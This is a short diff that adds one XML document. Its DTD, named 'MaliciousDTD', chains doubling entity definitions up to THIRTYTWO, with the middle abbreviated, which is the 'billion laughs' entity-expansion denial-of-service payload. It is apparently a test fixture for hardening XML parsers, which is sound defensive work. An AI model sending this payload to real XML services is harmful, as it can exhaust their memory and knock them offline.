@@ -1,0 +1,4 @@
+
+                  <?xml version="1.0"?><!DOCTYPE MaliciousDTD [<!ENTITY ZERO "A"><!ENTITY ONE "&ZERO;&ZERO;"><!ENTITY TWO "&ONE;&ONE;">...<!ENTITY THIRTYTWO "&THIRTYONE;&THIRTYONE;">]><data>&THIRTYTWO;</data>
+               
+            
